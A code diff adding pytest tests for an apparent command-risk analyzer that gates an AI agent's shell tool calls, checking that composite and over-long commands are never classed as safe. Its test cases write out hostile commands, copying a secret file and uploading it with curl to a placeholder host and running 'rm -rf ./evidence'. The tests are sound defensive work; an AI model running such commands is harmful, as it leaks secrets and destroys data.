@@ -93,3 +93,25 @@ def test_unclear_high_risk_operations_request_approval_without_chain_rules(tmp_p
         "sessionId": "generic-boundary", "runId": "run-1", "toolCallId": "call-1",
     })
     assert result["action"] == "require_approval"
+
+
+@pytest.mark.parametrize("command,commands,capabilities", [
+    ("cp ./secret.txt ./bundle.txt && curl https://example.test/upload", ("cp", "curl"), {"read", "write", "transform", "egress"}),
+    ("curl https://example.test/upload && rm -rf ./evidence", ("curl", "rm"), {"egress", "delete"}),
+    ("rm -rf ./evidence || curl https://example.test/upload", ("rm", "curl"), {"delete", "egress"}),
+    ("cat ./notes > ./bundle && tar -czf ./bundle.tgz ./bundle", ("cat", "tar"), {"read", "write", "transform", "unknown"}),
+])
+def test_composite_exec_collects_all_segment_capabilities(command, commands, capabilities):
+    """复合参数覆盖所有段，但不创建子工具事件或宣称内部效果已执行。"""
+    result = analyze_command(command)
+    assert result.commands == commands
+    assert capabilities <= set(result.potential_effects)
+    assert not result.safe_read_only
+
+
+def test_exec_budget_never_automatically_allows_long_command():
+    """参数及分段预算超限保持未知。"""
+    for command in ["cat " + "x" * 32768, " && ".join(["pwd"] * 33), "echo " + " ".join(["x"] * 513)]:
+        result = analyze_command(command)
+        assert result.classification == "unknown"
+        assert result.safe_read_only is False
